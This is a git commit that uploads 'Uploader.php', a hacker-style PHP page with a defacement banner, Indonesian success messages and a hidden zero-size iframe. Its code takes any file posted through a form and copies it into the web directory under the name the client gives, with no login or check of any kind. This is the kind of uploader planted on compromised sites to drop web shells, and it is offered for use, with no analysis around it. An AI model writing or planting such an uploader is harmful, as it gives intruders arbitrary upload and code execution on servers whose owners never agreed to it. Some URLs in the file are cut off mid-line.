fbdae9ccb8ed8e4169bda0a401df9fd1ebb79d45
InYourXerXez <51115343+IyXerXez72@users.noreply.github.com>
2019-06-08 20:55:46 +0700

    Add files via upload

---
+++ Uploader.php
@@ -0,0 +1,46 @@
+<html>
+<title>yoba222</title>
+<head>
+<center>
+        <style>
+
+                body{
+
+
+                        background-image:url(https://i.ibb.co/R7M>
+
+                        background-size:cover;
+
+                        background-attachment: fixed;
+
+                }
+
+                p{
+
+                        color:;
+                }
+
+        </style>
+</center>
+</head>
+<center>
+<?php
+echo '<html></head>
+        <body>
+            <h1>
+                <center>
+<img src="http://4.bp.blogspot.com/-kiaeYKF8vNM/Tvm2DjdnhLI/AAAAA>
+                    <font color="white">y9ba foanh jeje</font>
+                </center>
+            </h1>
+            <table width="700" border="0" cellpadding="3" cellspacing="1" align="center">';
+echo '<font color="white">';
+echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
+echo '<input type="file" name="file" size="500"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
+if( $_POST['_upl'] == "Upload" ) {
+if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b><br>DONE GAN TER UPLOAD &#128538;!!<b><br><br>'; }
+else { echo '<br><font color="red"><b>GAGAL TERUPLOAD SORI!!!</b><br><br>'; }
+}
+echo '<br><center><h1><marquee>Compiringht@&#9633;InYourXerXez7&#9633;</marquee></h1>';
+?>
+<span style="visibility: hidden"><iframe width="0%" height="0" scrolling="no" frameborder="no" loop="true" allow="autoplay" src="  ">
